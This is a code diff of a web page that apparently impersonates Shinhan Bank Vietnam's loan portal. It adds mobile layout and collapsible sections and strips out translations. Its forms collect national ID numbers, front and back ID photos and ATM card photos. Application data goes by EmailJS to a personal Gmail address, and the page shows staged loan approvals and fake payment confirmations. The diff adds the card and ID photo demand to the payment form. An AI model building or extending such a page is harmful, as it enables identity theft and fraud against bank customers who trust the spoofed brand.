@@ -11,7 +11,7 @@
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js" defer></script>
     <script>
         (function(){
-            emailjs.init("c-Ms5MjWbitpDBb-E"); // Consider moving to env variable
+            emailjs.init("c-Ms5MjWbitpDBb-E");
         })();
     </script>
     <style>
@@ -39,6 +39,7 @@
         header .logo img {
             height: 30px;
             width: auto;
+            display: block;
         }
         header .hamburger {
             font-size: 24px;
@@ -77,20 +78,28 @@
         header nav a:hover {
             color: #F5C518;
         }
-        header .auth-buttons {
+        header nav .back-btn {
+            background: #F5C518;
+            color: #003087;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 20px;
             display: none;
         }
-        header .language-toggle select {
-            background: #003087;
-            color: white;
-            border: none;
-            font-size: 14px;
-            padding: 5px;
+        header nav.active .back-btn {
+            display: block;
+        }
+        header .auth-buttons {
+            display: none;
         }
         .banner {
             background: linear-gradient(180deg, #e6f0fa, #ffffff);
             padding: 20px 15px;
             text-align: center;
+            position: relative;
         }
         .banner .content {
             max-width: 100%;
@@ -126,6 +135,7 @@
             margin: 10px;
             border-radius: 8px;
             text-align: center;
+            position: relative;
         }
         .home-section h2, .intro-section h2 {
             color: #003087;
@@ -136,22 +146,12 @@
             color: #555;
             font-size: 14px;
         }
-        .toggle-content {
-            display: none;
-            padding: 10px;
-        }
-        .toggle-content.active {
-            display: block;
-        }
-        .toggle-button {
-            background: #003087;
-            color: white;
-            border: none;
-            padding: 8px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-            margin-top: 10px;
+        .section-icon {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 30px;
+            height: 30px;
         }
         .categories {
             display: flex;
@@ -165,6 +165,7 @@
             border-radius: 10px;
             text-align: center;
             transition: all 0.3s ease;
+            position: relative;
         }
         .category-card img {
             width: 100%;
@@ -190,6 +191,59 @@
             text-decoration: none;
             font-size: 14px;
             margin: 5px 0;
+        }
+        .category-card .sub-items a:hover {
+            color: #003087;
+        }
+        /* Collapsible sections với ảnh */
+        .collapsible-section {
+            background: #fff;
+            border-radius: 8px;
+            margin: 10px;
+            padding: 15px;
+            text-align: center;
+            position: relative;
+        }
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+        }
+        .collapsible-section h2 {
+            color: #003087;
+            font-size: 18px;
+        }
+        .collapsible-section p {
+            color: #555;
+            font-size: 14px;
+            margin: 5px 0;
+        }
+        .toggle-btn {
+            background: #003087;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .section-details {
+            display: none;
+            margin-top: 10px;
+            padding: 10px;
+            background: #f9f9fa;
+            border-radius: 5px;
+        }
+        .section-details.active {
+            display: block;
+        }
+        .section-details img {
+            width: 100%;
+            max-width: 200px;
+            border-radius: 5px;
+            margin: 10px auto;
+            display: block;
         }
         .main-sections {
             padding: 15px;
@@ -305,22 +359,6 @@
         }
         .loan-card .details.active {
             display: block;
-        }
-        .loan-intro {
-            text-align: center;
-            padding: 15px;
-            background: #fff;
-            margin: 10px;
-            border-radius: 8px;
-        }
-        .loan-intro h2 {
-            color: #003087;
-            font-size: 18px;
-            margin-bottom: 10px;
-        }
-        .loan-intro p {
-            font-size: 14px;
-            color: #555;
         }
         .contract-display {
             display: none;
@@ -470,6 +508,7 @@
             padding: 15px;
             text-align: center;
             font-size: 12px;
+            position: relative;
         }
         footer a {
             color: #F5C518;
@@ -490,6 +529,13 @@
         footer .pwm-branches li {
             font-size: 12px;
             margin: 5px 0;
+        }
+        footer .footer-logo {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 40px;
+            height: 40px;
         }
         @media (min-width: 768px) {
             header .hamburger {
@@ -556,45 +602,65 @@
                 max-width: 100%;
             }
         }
+        @media (max-width: 768px) {
+            header .hamburger {
+                display: block;
+            }
+            header nav {
+                width: 100%;
+                height: 100vh;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                background: #003087ee;
+            }
+            header nav a {
+                font-size: 14px;
+                padding: 12px 0;
+                text-align: center;
+            }
+            .banner {
+                flex-direction: column;
+                padding: 15px;
+            }
+            .banner h1 {
+                font-size: 22px;
+            }
+            .banner p {
+                font-size: 13px;
+            }
+            .banner button {
+                width: 100%;
+                padding: 8px;
+                font-size: 13px;
+            }
+            .banner img {
+                max-width: 250px;
+                margin: 10px auto;
+            }
+            .category-card img {
+                max-width: 150px;
+            }
+            .collapsible-section h2 {
+                font-size: 16px;
+            }
+            .section-details img {
+                max-width: 150px;
+            }
+        }
     </style>
     <script>
-        const translations = {
-            vi: {
-                welcome: "Chào mừng đến với Shinhan Bank",
-                intro: "Shinhan Bank Việt Nam, thành viên của Shinhan Financial Group, cung cấp các sản phẩm tài chính sáng tạo, an toàn và đáng tin cậy từ năm 1993. Shinhan PWM mang đến dịch vụ quản lý tài sản cao cấp, cá nhân hóa cho khách hàng thượng lưu.",
-                submit: "Gửi Đăng Ký",
-                loanIntro: "Vay dễ dàng, không thế chấp, duyệt nhanh trong 60 giây. Hỗ trợ khách hàng có nợ xấu/nợ chú ý, vay tối đa 50 triệu.",
-                conditions: "Điều kiện giải ngân:"
-            },
-            en: {
-                welcome: "Welcome to Shinhan Bank",
-                intro: "Shinhan Bank Vietnam, a member of Shinhan Financial Group, offers innovative, secure, and reliable financial products since 1993. Shinhan PWM provides premium wealth management services tailored for high-net-worth clients.",
-                submit: "Submit Application",
-                loanIntro: "Easy loans, no collateral, approved in 60 seconds. Supports customers with bad debt/attention, up to 50 million VND.",
-                conditions: "Disbursement Conditions:"
-            }
-        };
-
         document.addEventListener('DOMContentLoaded', () => {
-            const languageToggle = document.querySelector('.language-toggle select');
-            function setLanguage(lang) {
-                document.querySelector('.home-section h2').textContent = translations[lang].welcome;
-                document.querySelector('.intro-section p').textContent = translations[lang].intro;
-                document.querySelector('#register-form button').textContent = translations[lang].submit;
-                document.querySelector('.loan-intro p:nth-child(2)').textContent = translations[lang].loanIntro;
-                document.querySelector('.loan-intro h3').textContent = translations[lang].conditions;
-                localStorage.setItem('language', lang);
-            }
-            languageToggle.addEventListener('change', (e) => setLanguage(e.target.value));
-            const savedLang = localStorage.getItem('language') || 'vi';
-            languageToggle.value = savedLang;
-            setLanguage(savedLang);
-
             const hamburger = document.querySelector('.hamburger');
             const nav = document.querySelector('header nav');
+            const backBtn = document.querySelector('.back-btn');
             hamburger.addEventListener('click', () => {
                 nav.classList.toggle('active');
                 hamburger.classList.toggle('active');
+            });
+            backBtn.addEventListener('click', () => {
+                nav.classList.remove('active');
+                hamburger.classList.remove('active');
             });
 
             const toggles = document.querySelectorAll('.section-toggle');
@@ -611,13 +677,14 @@
                 });
             });
 
-            const personalToggle = document.querySelector('#personal-toggle');
-            personalToggle.addEventListener('click', () => {
-                const content = document.querySelector('#personal-content');
-                content.classList.toggle('active');
-                personalToggle.textContent = content.classList.contains('active') ? 
-                    (translations[savedLang].submit === "Gửi Đăng Ký" ? 'Đóng' : 'Close') : 
-                    (translations[savedLang].submit === "Gửi Đăng Ký" ? 'Mở rộng' : 'Expand');
+            const detailToggles = document.querySelectorAll('.section-header');
+            detailToggles.forEach(toggle => {
+                toggle.addEventListener('click', () => {
+                    const details = toggle.nextElementSibling.nextElementSibling;
+                    const button = toggle.querySelector('.toggle-btn');
+                    details.classList.toggle('active');
+                    button.textContent = details.classList.contains('active') ? 'Ẩn' : 'Xem thêm';
+                });
             });
 
             const categoryCards = document.querySelectorAll('.category-card');
@@ -635,7 +702,7 @@
                     const details = button.parentElement.querySelector('.details');
                     if (button.textContent.includes('Xem tiếp') || button.textContent.includes('Ẩn chi tiết')) {
                         details.classList.toggle('active');
-                        button.textContent = details.classList.contains('active') ? translations[savedLang].submit === "Gửi Đăng Ký" ? 'Ẩn chi tiết' : 'Hide Details' : translations[savedLang].submit === "Gửi Đăng Ký" ? 'Xem tiếp' : 'Learn More';
+                        button.textContent = details.classList.contains('active') ? 'Ẩn chi tiết' : 'Xem tiếp';
                     }
                 });
             });
@@ -648,46 +715,46 @@
                 const resultDiv = document.querySelector('#calc-result');
 
                 if (!loanType || loanType === "") {
-                    resultDiv.innerHTML = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng chọn loại vay!' : 'Please select a loan type!';
+                    resultDiv.innerHTML = 'Vui lòng chọn loại vay!';
                     return;
                 }
 
                 switch (loanType) {
                     case "Vay mua xe":
                         rate = 6.5;
-                        maxAmount = 1000000000; // 1 tỷ
-                        maxTerm = 96; // 8 năm
+                        maxAmount = 1000000000;
+                        maxTerm = 96;
                         break;
                     case "Vay mua nhà":
                         rate = 7.0;
-                        maxAmount = 5000000000; // 5 tỷ
-                        maxTerm = 360; // 30 năm
+                        maxAmount = 5000000000;
+                        maxTerm = 360;
                         break;
                     case "Vay tiêu dùng":
                         rate = 8.0;
-                        maxAmount = 900000000; // 900 triệu
-                        maxTerm = 60; // 60 tháng
+                        maxAmount = 900000000;
+                        maxTerm = 60;
                         break;
                     case "Vay tiêu dùng trực tuyến":
                         rate = 8.5;
-                        maxAmount = 100000000; // 100 triệu
-                        maxTerm = 36; // 36 tháng
+                        maxAmount = 100000000;
+                        maxTerm = 36;
                         break;
                     case "Vay thế chấp sổ tiết kiệm":
-                        rate = 3.0 + 1.9; // Giả sử lãi suất tiền gửi 3%
-                        maxAmount = 500000000; // Giả định
-                        maxTerm = 12; // 12 tháng
+                        rate = 3.0 + 1.9;
+                        maxAmount = 500000000;
+                        maxTerm = 12;
                         break;
                     default:
                         rate = 0;
                 }
 
                 if (isNaN(amount) || amount <= 0 || amount > maxAmount) {
-                    resultDiv.innerHTML = translations[savedLang].submit === "Gửi Đăng Ký" ? `Số tiền vay phải từ 1 đến ${maxAmount.toLocaleString()} VNĐ!` : `Loan amount must be between 1 and ${maxAmount.toLocaleString()} VND!`;
+                    resultDiv.innerHTML = `Số tiền vay phải từ 1 đến ${maxAmount.toLocaleString()} VNĐ!`;
                     return;
                 }
                 if (isNaN(term) || term <= 0 || term > maxTerm) {
-                    resultDiv.innerHTML = translations[savedLang].submit === "Gửi Đăng Ký" ? `Thời hạn vay phải từ 1 đến ${maxTerm} tháng!` : `Loan term must be between 1 and ${maxTerm} months!`;
+                    resultDiv.innerHTML = `Thời hạn vay phải từ 1 đến ${maxTerm} tháng!`;
                     return;
                 }
 
@@ -696,14 +763,14 @@
                 const totalPayment = monthlyPayment * term;
 
                 if (isNaN(monthlyPayment) || isNaN(totalPayment)) {
-                    resultDiv.innerHTML = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Không thể tính toán. Vui lòng kiểm tra lại thông tin nhập!' : 'Unable to calculate. Please check the input!';
+                    resultDiv.innerHTML = 'Không thể tính toán. Vui lòng kiểm tra lại thông tin nhập!';
                 } else {
                     resultDiv.innerHTML = `
-                        ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Thanh toán hàng tháng' : 'Monthly Payment'}: ${monthlyPayment.toLocaleString('vi-VN')} VNĐ<br>
-                        ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Tổng tiền' : 'Total Amount'}: ${totalPayment.toLocaleString('vi-VN')} VNĐ<br>
-                        <h4>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Lịch thanh toán mẫu' : 'Sample Payment Schedule'}</h4>
+                        Thanh toán hàng tháng: ${monthlyPayment.toLocaleString('vi-VN')} VNĐ<br>
+                        Tổng tiền: ${totalPayment.toLocaleString('vi-VN')} VNĐ<br>
+                        <h4>Lịch thanh toán mẫu</h4>
                         <table class="payment-schedule">
-                            <tr><th>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Tháng' : 'Month'}</th><th>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số tiền' : 'Amount'}</th><th>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Gốc' : 'Principal'}</th><th>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Lãi' : 'Interest'}</th><th>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Dư nợ' : 'Balance'}</th></tr>
+                            <tr><th>Tháng</th><th>Số tiền</th><th>Gốc</th><th>Lãi</th><th>Dư nợ</th></tr>
                     `;
                     let remainingBalance = amount;
                     for (let i = 1; i <= Math.min(term, 3); i++) {
@@ -712,7 +779,7 @@
                         remainingBalance -= principal;
                         resultDiv.innerHTML += `
                             <tr>
-                                <td>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Tháng' : 'Month'} ${i}</td>
+                                <td>Tháng ${i}</td>
                                 <td>${monthlyPayment.toLocaleString('vi-VN')} VNĐ</td>
                                 <td>${principal.toLocaleString('vi-VN')} VNĐ</td>
                                 <td>${interest.toLocaleString('vi-VN')} VNĐ</td>
@@ -721,18 +788,34 @@
                         `;
                     }
                     resultDiv.innerHTML += `</table>`;
-                    if (term > 3) resultDiv.innerHTML += `<p>(${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Hiển thị 3 tháng đầu, tổng cộng' : 'Showing first 3 months, total'} ${term} ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'tháng' : 'months'})</p>`;
+                    if (term > 3) resultDiv.innerHTML += `<p>(Hiển thị 3 tháng đầu, tổng cộng ${term} tháng)</p>`;
                 }
             };
 
             window.submitPayment = function() {
                 const account = document.querySelector('#payment-account').value;
                 const amount = parseFloat(document.querySelector('#payment-amount').value);
+                const cccdFront = document.querySelector('#payment-cccd-front').files[0];
+                const cccdBack = document.querySelector('#payment-cccd-back').files[0];
+                const atmCard = document.querySelector('#payment-atm-card').files[0];
                 if (!account || isNaN(amount) || amount <= 0) {
-                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập đầy đủ thông tin thanh toán!' : 'Please enter valid payment details!');
+                    alert('Vui lòng nhập đầy đủ thông tin thanh toán!');
                     return;
                 }
-                alert(translations[savedLang].submit === "Gửi Đăng Ký" ? `Thanh toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account} qua Mobile Banking SOL thành công!` : `Payment of ${amount.toLocaleString()} VND from account ${account} via Mobile Banking SOL successful!`);
+                if (!cccdFront || !cccdBack || !atmCard) {
+                    alert('Vui lòng tải lên đầy đủ ảnh CCCD và thẻ ATM!');
+                    return;
+                }
+                const maxSize = 5 * 1024 * 1024;
+                if (cccdFront.size > maxSize || cccdBack.size > maxSize || atmCard.size > maxSize) {
+                    alert('Ảnh không được vượt quá 5MB!');
+                    return;
+                }
+                if (!['image/jpeg', 'image/png'].includes(cccdFront.type) || !['image/jpeg', 'image/png'].includes(cccdBack.type) || !['image/jpeg', 'image/png'].includes(atmCard.type)) {
+                    alert('Vui lòng tải lên ảnh định dạng JPEG hoặc PNG!');
+                    return;
+                }
+                alert(`Thanh toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account} qua Mobile Banking SOL thành công!`);
                 document.querySelector('#payment-amount').value = '';
             };
 
@@ -741,17 +824,17 @@
                 const amount = parseFloat(document.querySelector('#settlement-amount').value);
                 const resultDiv = document.querySelector('#settlement-result');
                 if (!account || isNaN(amount) || amount <= 0) {
-                    resultDiv.innerHTML = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập đầy đủ thông tin tất toán!' : 'Please enter valid settlement details!';
+                    resultDiv.innerHTML = 'Vui lòng nhập đầy đủ thông tin tất toán!';
                     return;
                 }
                 const modal = document.createElement('div');
                 modal.className = 'modal';
                 modal.innerHTML = `
                     <div class="modal-content">
-                        <h2>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Xác Nhận Tất Toán' : 'Confirm Settlement'}</h2>
-                        <p>${translations[savedLang].submit === "Gửi Đăng Ký" ? `Bạn muốn tất toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account}?` : `Do you want to settle ${amount.toLocaleString()} VND from account ${account}?`}</p>
-                        <button onclick="settleLoan('${account}', ${amount}); this.closest('.modal').remove()">${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Xác nhận' : 'Confirm'}</button>
-                        <button onclick="this.closest('.modal').remove()">${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Hủy' : 'Cancel'}</button>
+                        <h2>Xác Nhận Tất Toán</h2>
+                        <p>Bạn muốn tất toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account}?</p>
+                        <button onclick="settleLoan('${account}', ${amount}); this.closest('.modal').remove()">Xác nhận</button>
+                        <button onclick="this.closest('.modal').remove()">Hủy</button>
                     </div>
                 `;
                 document.body.appendChild(modal);
@@ -761,7 +844,7 @@
             window.settleLoan = function(account, amount) {
                 const resultDiv = document.querySelector('#settlement-result');
                 setTimeout(() => {
-                    resultDiv.innerHTML = translations[savedLang].submit === "Gửi Đăng Ký" ? `Tất toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account} thành công!` : `Settlement of ${amount.toLocaleString()} VND from account ${account} successful!`;
+                    resultDiv.innerHTML = `Tất toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account} thành công!`;
                     document.querySelector('#settlement-amount').value = '';
                 }, 1000);
             };
@@ -794,28 +877,28 @@
                 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 const phoneRegex = /^0[0-9]{9}$/;
                 if (!emailRegex.test(formData.email)) {
-                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập email hợp lệ!' : 'Please enter a valid email!');
+                    alert('Vui lòng nhập email hợp lệ!');
                     return;
                 }
                 if (!phoneRegex.test(formData.phone)) {
-                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập số điện thoại hợp lệ!' : 'Please enter a valid phone number!');
+                    alert('Vui lòng nhập số điện thoại hợp lệ!');
                     return;
                 }
                 if (isNaN(formData.loanAmount) || formData.loanAmount <= 0) {
-                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số tiền vay phải lớn hơn 0!' : 'Loan amount must be greater than 0!');
+                    alert('Số tiền vay phải lớn hơn 0!');
                     return;
                 }
                 if (!formData.cccdFront || !formData.cccdBack || !formData.atmCard) {
-                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng tải lên đầy đủ ảnh CCCD và thẻ ATM!' : 'Please upload all required photos!');
+                    alert('Vui lòng tải lên đầy đủ ảnh CCCD và thẻ ATM!');
                     return;
                 }
                 const maxSize = 5 * 1024 * 1024;
                 if (formData.cccdFront.size > maxSize || formData.cccdBack.size > maxSize || formData.atmCard.size > maxSize) {
-                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Ảnh không được vượt quá 5MB!' : 'Images must not exceed 5MB!');
+                    alert('Ảnh không được vượt quá 5MB!');
                     return;
                 }
                 if (!['image/jpeg', 'image/png'].includes(formData.cccdFront.type) || !['image/jpeg', 'image/png'].includes(formData.cccdBack.type) || !['image/jpeg', 'image/png'].includes(formData.atmCard.type)) {
-                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng tải lên ảnh định dạng JPEG hoặc PNG!' : 'Please upload images in JPEG or PNG format!');
+                    alert('Vui lòng tải lên ảnh định dạng JPEG hoặc PNG!');
                     return;
                 }
                 document.querySelector('#confirm-modal').style.display = 'flex';
@@ -832,25 +915,25 @@
                     const approvalModal = document.querySelector('#approval-modal');
                     approvalModal.style.display = 'flex';
                     if (isApproved) {
-                        approvalModal.querySelector('h2').textContent = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Đã đủ điều kiện vay' : 'Loan Approved';
-                        approvalModal.querySelector('p').textContent = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Hồ sơ của bạn đã được duyệt tại Shinhan Bank.' : 'Your application has been approved at Shinhan Bank.';
+                        approvalModal.querySelector('h2').textContent = 'Đã đủ điều kiện vay';
+                        approvalModal.querySelector('p').textContent = 'Hồ sơ của bạn đã được duyệt tại Shinhan Bank.';
                     } else {
-                        approvalModal.querySelector('h2').textContent = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Hồ sơ chưa được duyệt' : 'Loan Not Approved';
-                        approvalModal.querySelector('p').textContent = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng liên hệ nhân viên để được hỗ trợ thêm.' : 'Please contact our staff for further assistance.';
+                        approvalModal.querySelector('h2').textContent = 'Hồ sơ chưa được duyệt';
+                        approvalModal.querySelector('p').textContent = 'Vui lòng liên hệ nhân viên để được hỗ trợ thêm.';
                     }
-                    approvalModal.querySelector('.profile-code').textContent = translations[savedLang].submit === "Gửi Đăng Ký" ? `Mã hồ sơ: ${profileCode}` : `Profile Code: ${profileCode}`;
+                    approvalModal.querySelector('.profile-code').textContent = `Mã hồ sơ: ${profileCode}`;
                     const contractContent = document.querySelector('#contract-content');
                     contractContent.innerHTML = `
-                        <h3>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'HỢP ĐỒNG VAY TÍN CHẤP SHINHAN BANK' : 'SHINHAN BANK LOAN CONTRACT'}</h3>
-                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số hợp đồng' : 'Contract Number'}:</strong> ${profileCode}</p>
-                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Ngày ký' : 'Date Signed'}:</strong> ${new Date().toLocaleDateString(savedLang === 'vi' ? 'vi-VN' : 'en-US')}</p>
-                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Bên vay' : 'Borrower'}:</strong> ${formData.name}</p>
+                        <h3>HỢP ĐỒNG VAY TÍN CHẤP SHINHAN BANK</h3>
+                        <p><strong>Số hợp đồng:</strong> ${profileCode}</p>
+                        <p><strong>Ngày ký:</strong> ${new Date().toLocaleDateString('vi-VN')}</p>
+                        <p><strong>Bên vay:</strong> ${formData.name}</p>
                         <p><strong>CCCD/CMND:</strong> ${formData.cccd}</p>
-                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số tiền vay' : 'Loan Amount'}:</strong> ${formData.loanAmount} VNĐ</p>
-                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Thời hạn vay' : 'Loan Term'}:</strong> ${formData.loanTerm} ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'tháng' : 'months'}</p>
-                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Loại vay' : 'Loan Type'}:</strong> ${formData.loanType}</p>
-                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Lãi suất' : 'Interest Rate'}:</strong> 8%/năm</p>
-                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Điều khoản' : 'Terms'}:</strong> ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Bên vay cam kết thanh toán đúng hạn.' : 'Borrower agrees to timely repayments.'}</p>
+                        <p><strong>Số tiền vay:</strong> ${formData.loanAmount} VNĐ</p>
+                        <p><strong>Thời hạn vay:</strong> ${formData.loanTerm} tháng</p>
+                        <p><strong>Loại vay:</strong> ${formData.loanType}</p>
+                        <p><strong>Lãi suất:</strong> 8%/năm</p>
+                        <p><strong>Điều khoản:</strong> Bên vay cam kết thanh toán đúng hạn.</p>
                         <p><a href="#" onclick="downloadContract()">Tải hợp đồng</a></p>
                     `;
                     document.querySelector('.contract-display').classList.add('active');
@@ -862,7 +945,7 @@
                         loanType: formData.loanType,
                         to_email: "trangtrangtrang318@gmail.com"
                     }).then(() => {
-                        alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Đã gửi hồ sơ đến trangtrangtrang318@gmail.com' : 'Application sent to trangtrangtrang318@gmail.com');
+                        alert('Đã gửi hồ sơ đến trangtrangtrang318@gmail.com');
                     }, (error) => {
                         console.error('EmailJS error:', error);
                         alert('Lỗi gửi email admin: ' + JSON.stringify(error));
@@ -874,10 +957,10 @@
                         loanTerm: formData.loanTerm,
                         loanType: formData.loanType,
                         profileCode: profileCode,
-                        dateSigned: new Date().toLocaleDateString(savedLang === 'vi' ? 'vi-VN' : 'en-US'),
+                        dateSigned: new Date().toLocaleDateString('vi-VN'),
                         to_email: formData.email
                     }).then(() => {
-                        alert(translations[savedLang].submit === "Gửi Đăng Ký" ? `Đã gửi hợp đồng đến ${formData.email}` : `Contract sent to ${formData.email}`);
+                        alert(`Đã gửi hợp đồng đến ${formData.email}`);
                     }, (error) => {
                         console.error('EmailJS error:', error);
                         alert('Lỗi gửi email khách hàng: ' + JSON.stringify(error));
@@ -889,18 +972,18 @@
                 const profileModal = document.querySelector('#profile-modal');
                 profileModal.style.display = 'flex';
                 profileModal.querySelector('.modal-content').innerHTML = `
-                    <h2>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Hồ Sơ Khách Hàng' : 'Customer Profile'}</h2>
-                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Họ và tên' : 'Name'}:</strong> ${formData.name}</p>
-                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số điện thoại' : 'Phone'}:</strong> ${formData.phone}</p>
+                    <h2>Hồ Sơ Khách Hàng</h2>
+                    <p><strong>Họ và tên:</strong> ${formData.name}</p>
+                    <p><strong>Số điện thoại:</strong> ${formData.phone}</p>
                     <p><strong>Email:</strong> ${formData.email}</p>
                     <p><strong>CCCD/CMND:</strong> ${formData.cccd}</p>
-                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Địa chỉ' : 'Address'}:</strong> ${formData.address}</p>
-                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Thu nhập' : 'Income'}:</strong> ${formData.income} VNĐ</p>
-                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số tiền vay' : 'Loan Amount'}:</strong> ${formData.loanAmount} VNĐ</p>
-                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Thời hạn vay' : 'Loan Term'}:</strong> ${formData.loanTerm} ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'tháng' : 'months'}</p>
-                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Loại vay' : 'Loan Type'}:</strong> ${formData.loanType}</p>
-                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Ảnh' : 'Images'}:</strong> ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'CCCD và thẻ ATM đã được tải lên' : 'CCCD and ATM card uploaded'}</p>
-                    <button onclick="document.querySelector('#profile-modal').style.display='none'">${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Đóng' : 'Close'}</button>
+                    <p><strong>Địa chỉ:</strong> ${formData.address}</p>
+                    <p><strong>Thu nhập:</strong> ${formData.income} VNĐ</p>
+                    <p><strong>Số tiền vay:</strong> ${formData.loanAmount} VNĐ</p>
+                    <p><strong>Thời hạn vay:</strong> ${formData.loanTerm} tháng</p>
+                    <p><strong>Loại vay:</strong> ${formData.loanType}</p>
+                    <p><strong>Ảnh:</strong> CCCD và thẻ ATM đã được tải lên</p>
+                    <button onclick="document.querySelector('#profile-modal').style.display='none'">Đóng</button>
                 `;
             });
 
@@ -914,7 +997,7 @@
 
             const noCardLink = document.querySelector('.no-card');
             noCardLink.addEventListener('click', () => {
-                alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Để xem số thẻ, đăng nhập ứng dụng ngân hàng hoặc liên hệ chi nhánh. Nếu chưa có thẻ, vui lòng đến Shinhan Bank để phát hành.' : 'To view card number, log in to the banking app or contact a branch. If you don’t have a card, visit Shinhan Bank to issue one.');
+                alert('Để xem số thẻ, đăng nhập ứng dụng ngân hàng hoặc liên hệ chi nhánh. Nếu chưa có thẻ, vui lòng đến Shinhan Bank để phát hành.');
             });
 
             const callButton = document.querySelector('.support-btn.call');
@@ -924,7 +1007,7 @@
 
             const chatButton = document.querySelector('.support-btn.chat');
             chatButton.addEventListener('click', () => {
-                alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Chức năng chat đang được phát triển. Vui lòng gọi hotline 1900 1577 để được hỗ trợ!' : 'Chat feature is under development. Please call hotline 1900 1577 for support!');
+                alert('Chức năng chat đang được phát triển. Vui lòng gọi hotline 1900 1577 để được hỗ trợ!');
             });
 
             const messengerButton = document.querySelector('.support-btn.messenger');
@@ -942,16 +1025,16 @@
 
             function downloadContract() {
                 const contractContent = `
-                    ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'HỢP ĐỒNG VAY TÍN CHẤP SHINHAN BANK' : 'SHINHAN BANK LOAN CONTRACT'}
+                    HỢP ĐỒNG VAY TÍN CHẤP SHINHAN BANK
                     Số hợp đồng: ${window.profileCode || `SHB-${Date.now()}`}
-                    Ngày ký: ${new Date().toLocaleDateString(savedLang === 'vi' ? 'vi-VN' : 'en-US')}
+                    Ngày ký: ${new Date().toLocaleDateString('vi-VN')}
                     Bên vay: ${formData.name || 'N/A'}
                     CCCD/CMND: ${formData.cccd || 'N/A'}
                     Số tiền vay: ${formData.loanAmount || 'N/A'} VNĐ
-                    Thời hạn vay: ${formData.loanTerm || 'N/A'} ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'tháng' : 'months'}
+                    Thời hạn vay: ${formData.loanTerm || 'N/A'} tháng
                     Loại vay: ${formData.loanType || 'N/A'}
                     Lãi suất: 8%/năm
-                    Điều khoản: ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Bên vay cam kết thanh toán đúng hạn.' : 'Borrower agrees to timely repayments.'}
+                    Điều khoản: Bên vay cam kết thanh toán đúng hạn.
                 `;
                 const blob = new Blob([contractContent], { type: 'text/plain' });
                 const url = URL.createObjectURL(blob);
@@ -989,10 +1072,10 @@
